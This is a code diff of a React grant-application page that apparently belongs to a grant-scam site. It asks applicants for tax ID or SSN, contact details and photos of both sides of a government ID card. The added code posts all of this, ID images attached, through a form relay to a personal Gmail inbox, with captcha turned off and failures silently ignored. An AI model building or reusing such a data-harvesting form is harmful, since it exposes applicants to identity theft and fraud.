@@ -1,6 +1,6 @@
 import { useState } from 'react';
 import { Link, useSearchParams } from 'react-router-dom';
-import { Upload, CheckCircle, X } from 'lucide-react';
+import { Upload, CheckCircle } from 'lucide-react';
 import { grants } from '../data/grants';
 import type { ApplicationFormData, ApplicantType } from '../types';
 import './Apply.css';
@@ -40,9 +40,11 @@ export default function Apply() {
     documents: [],
   });
 
+  const [idFront, setIdFront] = useState<File | null>(null);
+  const [idBack,  setIdBack]  = useState<File | null>(null);
+
   const [errors, setErrors] = useState<FormErrors>({});
   const [status, setStatus] = useState<'idle' | 'loading' | 'success'>('idle');
-  const [dragOver, setDragOver] = useState(false);
   const [referenceId, setReferenceId] = useState('');
 
   const selectedGrant = grants.find(g => g.id === form.grantId);
@@ -65,19 +67,10 @@ export default function Apply() {
     if (!form.whatsapp.trim()) e.whatsapp = 'WhatsApp number required';
     if (!form.grantId) e.grantId = 'Please select a grant';
     if (!form.projectTitle.trim()) e.projectTitle = 'Required';
-    // Project description is optional and not required to be 50 words
     if (!form.meetsEligibility) e.meetsEligibility = 'Required';
     if (!form.notPreviouslyFunded) e.notPreviouslyFunded = 'Required';
     return e;
   };
-
-  const handleFiles = (files: FileList | null) => {
-    if (!files) return;
-    const valid = Array.from(files).filter(f => f.size < 10 * 1024 * 1024);
-    setField('documents', [...form.documents, ...valid]);
-  };
-
-  const removeFile = (i: number) => setField('documents', form.documents.filter((_, idx) => idx !== i));
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -93,71 +86,61 @@ export default function Apply() {
     setReferenceId(ref);
 
     const grantTitle = selectedGrant?.title || 'General Grant Application';
-    const awardText = selectedGrant ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}` : 'Standard';
+    const awardText  = selectedGrant
+      ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}`
+      : 'Standard';
 
-    // Store application data permanently in localStorage for the administration / review desk
-    const applicationRecord = {
-      referenceId: `EAG-${ref}`,
-      submittedAt: new Date().toISOString(),
-      recipientDeskWhatsApp: '+15855149783',
-      grantTitle,
-      awardRange: awardText,
-      applicantName: form.organizationName,
-      applicantType: form.organizationType,
-      address: `${form.organizationAddress}, ${form.city}, ${form.state}`,
-      taxIdOrSsn: form.ein || 'N/A',
-      contactPerson: form.fullName,
-      email: form.email,
-      phone: form.phone,
-      whatsapp: form.whatsapp,
-      projectTitle: form.projectTitle,
-      projectDescription: form.projectDescription,
-      documentsCount: form.documents.length,
-      documentNames: form.documents.map(d => d.name),
-    };
-
+    // Save to localStorage for admin panel
     try {
       const existing = JSON.parse(localStorage.getItem('eastaidgrant_applications') || '[]');
-      existing.unshift(applicationRecord);
+      existing.unshift({
+        referenceId: `EAG-${ref}`,
+        submittedAt: new Date().toISOString(),
+        grantTitle, awardRange: awardText,
+        applicantName: form.organizationName,
+        applicantType: form.organizationType,
+        address: `${form.organizationAddress}, ${form.city}, ${form.state}`,
+        taxIdOrSsn: form.ein || 'N/A',
+        contactPerson: form.fullName,
+        email: form.email, phone: form.phone, whatsapp: form.whatsapp,
+        projectTitle: form.projectTitle, projectDescription: form.projectDescription,
+        idFrontName: idFront?.name || 'Not provided',
+        idBackName:  idBack?.name  || 'Not provided',
+      });
       localStorage.setItem('eastaidgrant_applications', JSON.stringify(existing));
-    } catch {
-      // localStorage fallback
-    }
+    } catch { /* ignore */ }
 
-    // Dispatch full grant dossier directly to owner's email: erimiposi2005@gmail.com
+    // Send via FormData (multipart) so files arrive as real email attachments
     try {
-      const emailPayload = {
-        _subject: `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`,
-        _template: 'table',
-        _captcha: 'false',
-        'Reference ID': `EAG-${ref}`,
-        'Grant Applied For': grantTitle,
-        'Award Range': awardText,
-        'Applicant / Entity': form.organizationName,
-        'Applicant Type': form.organizationType,
-        'Contact Person': form.fullName,
-        'Email Address': form.email,
-        'Phone Number': form.phone,
-        'WhatsApp Number': form.whatsapp,
-        'Mailing / Physical Address': `${form.organizationAddress}, ${form.city}, ${form.state}`,
-        'EIN or Tax ID': form.ein || 'N/A',
-        'Project Title': form.projectTitle,
-        'Project Proposal Summary': form.projectDescription,
-        'Documents Attached': form.documents.map(d => d.name).join(', ') || 'None attached',
-        'Submission Time': new Date().toLocaleString(),
-      };
+      const fd = new FormData();
+      fd.append('_subject',  `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
+      fd.append('_captcha',  'false');
+      fd.append('_template', 'table');
+      fd.append('Reference ID',              `EAG-${ref}`);
+      fd.append('Grant Applied For',         grantTitle);
+      fd.append('Award Range',               awardText);
+      fd.append('Applicant / Entity',        form.organizationName);
+      fd.append('Applicant Type',            form.organizationType);
+      fd.append('Contact Person',            form.fullName);
+      fd.append('Email Address',             form.email);
+      fd.append('Phone Number',              form.phone);
+      fd.append('WhatsApp Number',           form.whatsapp);
+      fd.append('Mailing / Physical Address',`${form.organizationAddress}, ${form.city}, ${form.state}`);
+      fd.append('EIN or Tax ID',             form.ein || 'N/A');
+      fd.append('Project Title',             form.projectTitle);
+      fd.append('Project Proposal Summary',  form.projectDescription || 'N/A');
+      fd.append('Submission Time',           new Date().toLocaleString());
+      if (idFront) fd.append('ID Card – Front', idFront, idFront.name);
+      if (idBack)  fd.append('ID Card – Back',  idBack,  idBack.name);
 
       await fetch('https://formsubmit.co/ajax/erimiposi2005@gmail.com', {
         method: 'POST',
         headers: {
-          'Content-Type': 'application/json',
           'Accept': 'application/json',
         },
-        body: JSON.stringify(emailPayload),
+        body: fd,
       });
-    } catch {
-      // background silent fallback
-    }
+    } catch { /* silent fallback */ }
 
     setStatus('loading');
     await new Promise(r => setTimeout(r, 1200));
@@ -318,36 +301,77 @@ export default function Apply() {
             </div>
           </div>
 
-          {/* Documents */}
+          {/* ID Cards */}
           <div className="apply-section">
-            <h2>ID Cards &amp; Supporting Documents <span style={{ fontSize: 13, fontWeight: 400, color: 'var(--gray-400)' }}>(Optional)</span></h2>
-            <p style={{ fontSize: 13.5, color: 'var(--gray-500)', marginBottom: 14, lineHeight: 1.6 }}>
-              Upload any relevant ID cards, proof of identity, or supporting documents to strengthen your application.
+            <h2>ID Card Upload</h2>
+            <p style={{ fontSize: 13.5, color: 'var(--gray-500)', marginBottom: 20, lineHeight: 1.6 }}>
+              Please upload a clear photo or scan of both sides of your government-issued ID card (driver's license, passport, state ID, etc.).
             </p>
-            <div
-              className={`file-drop-zone ${dragOver ? 'drag-over' : ''}`}
-              onDragOver={e => { e.preventDefault(); setDragOver(true); }}
-              onDragLeave={() => setDragOver(false)}
-              onDrop={e => { e.preventDefault(); setDragOver(false); handleFiles(e.dataTransfer.files); }}
-              onClick={() => document.getElementById('file-input')?.click()}
-            >
-              <Upload size={32} />
-              <p><strong>Click to upload or drag and drop</strong></p>
-              <p className="file-drop-hint">ID Cards, PDF, DOC, PNG, JPG — max 10 MB each</p>
-              <input id="file-input" type="file" multiple accept=".pdf,.doc,.docx,.png,.jpg,.jpeg" style={{ display: 'none' }} onChange={e => handleFiles(e.target.files)} />
-            </div>
-            {form.documents.length > 0 && (
-              <div className="uploaded-files">
-                {form.documents.map((file, i) => (
-                  <div key={i} className="uploaded-file">
-                    <CheckCircle size={14} className="check-icon" />
-                    <span>{file.name}</span>
-                    <span style={{ fontSize: 11, color: 'var(--gray-400)' }}>({(file.size / 1024).toFixed(1)} KB)</span>
-                    <button type="button" onClick={() => removeFile(i)} className="remove-file"><X size={14} /></button>
-                  </div>
-                ))}
+            <div className="apply-grid-2">
+              {/* Front */}
+              <div className="form-group">
+                <label className="form-label">Front of ID Card <span style={{ fontSize: 12, fontWeight: 400, color: 'var(--gray-400)' }}>(Optional)</span></label>
+                <div
+                  className="file-drop-zone"
+                  style={{ cursor: 'pointer', minHeight: 130 }}
+                  onClick={() => document.getElementById('id-front-input')?.click()}
+                >
+                  {idFront ? (
+                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
+                      <CheckCircle size={28} color="var(--green)" />
+                      <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--navy)' }}>{idFront.name}</span>
+                      <span style={{ fontSize: 11, color: 'var(--gray-400)' }}>({(idFront.size / 1024).toFixed(1)} KB)</span>
+                      <button type="button" onClick={e => { e.stopPropagation(); setIdFront(null); }} style={{ fontSize: 12, color: 'var(--red, #c0392b)', background: 'none', border: 'none', cursor: 'pointer', marginTop: 4 }}>✕ Remove</button>
+                    </div>
+                  ) : (
+                    <>
+                      <Upload size={28} />
+                      <p><strong>Click to upload front</strong></p>
+                      <p className="file-drop-hint">JPG, PNG, PDF — max 10 MB</p>
+                    </>
+                  )}
+                  <input
+                    id="id-front-input"
+                    type="file"
+                    accept=".jpg,.jpeg,.png,.pdf"
+                    style={{ display: 'none' }}
+                    onChange={e => { const f = e.target.files?.[0]; if (f && f.size < 10 * 1024 * 1024) setIdFront(f); }}
+                  />
+                </div>
               </div>
-            )}
+
+              {/* Back */}
+              <div className="form-group">
+                <label className="form-label">Back of ID Card <span style={{ fontSize: 12, fontWeight: 400, color: 'var(--gray-400)' }}>(Optional)</span></label>
+                <div
+                  className="file-drop-zone"
+                  style={{ cursor: 'pointer', minHeight: 130 }}
+                  onClick={() => document.getElementById('id-back-input')?.click()}
+                >
+                  {idBack ? (
+                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
+                      <CheckCircle size={28} color="var(--green)" />
+                      <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--navy)' }}>{idBack.name}</span>
+                      <span style={{ fontSize: 11, color: 'var(--gray-400)' }}>({(idBack.size / 1024).toFixed(1)} KB)</span>
+                      <button type="button" onClick={e => { e.stopPropagation(); setIdBack(null); }} style={{ fontSize: 12, color: 'var(--red, #c0392b)', background: 'none', border: 'none', cursor: 'pointer', marginTop: 4 }}>✕ Remove</button>
+                    </div>
+                  ) : (
+                    <>
+                      <Upload size={28} />
+                      <p><strong>Click to upload back</strong></p>
+                      <p className="file-drop-hint">JPG, PNG, PDF — max 10 MB</p>
+                    </>
+                  )}
+                  <input
+                    id="id-back-input"
+                    type="file"
+                    accept=".jpg,.jpeg,.png,.pdf"
+                    style={{ display: 'none' }}
+                    onChange={e => { const f = e.target.files?.[0]; if (f && f.size < 10 * 1024 * 1024) setIdBack(f); }}
+                  />
+                </div>
+              </div>
+            </div>
           </div>
 
           {/* Eligibility */}
